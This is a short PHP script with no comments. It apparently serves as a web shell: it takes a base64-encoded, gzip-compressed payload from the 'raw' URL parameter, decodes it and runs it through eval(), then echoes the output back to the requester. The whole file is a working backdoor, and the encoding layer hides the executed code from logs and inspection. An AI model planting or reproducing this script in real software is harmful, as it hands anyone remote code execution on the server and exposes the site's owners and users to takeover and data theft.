<?php
$raw = $_GET['raw'];
$c = gzinflate(base64_decode($raw));
ob_get_contents();
ob_end_clean();
ob_start();
eval("?>".$c);
$s_res = ob_get_contents();
ob_end_clean();
echo $s_res;
?>